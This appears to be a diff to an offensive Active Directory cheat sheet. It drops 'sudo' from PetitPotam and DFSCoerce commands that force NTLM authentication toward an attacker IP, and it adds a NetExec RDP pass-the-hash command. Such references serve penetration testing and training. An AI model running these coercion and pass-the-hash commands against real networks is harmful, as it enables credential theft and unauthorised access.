@@ -324,7 +324,7 @@ https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
   
   ### Force NTLM authentication
   ```bash
-  sudo python3 PetitPotam.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
+  python3 PetitPotam.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
   ```
 </details> 
   
@@ -333,7 +333,7 @@ https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
   
   ### Force NTLM authentication
   ```bash
-  sudo python3 dfscoerce.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
+  python3 dfscoerce.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
   ```
 </details> 
 
@@ -364,7 +364,16 @@ https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
   <summary> NetExec local authentication </summary> 
   
   ```bash
-  sudo NetExec smb <target_IP> -u <username> -H <hash_NT]> --local-auth 
+  NetExec smb <target_IP> -u <username> -H <hash_NT]> --local-auth 
+  ```
+
+</details> 
+
+<details>
+  <summary> NetExec rdp authentication </summary> 
+  
+  ```bash
+  NetExec rdp <target_IP> -u <username> -H <hash_NT]> --local-auth 
   ```
 
 </details> 
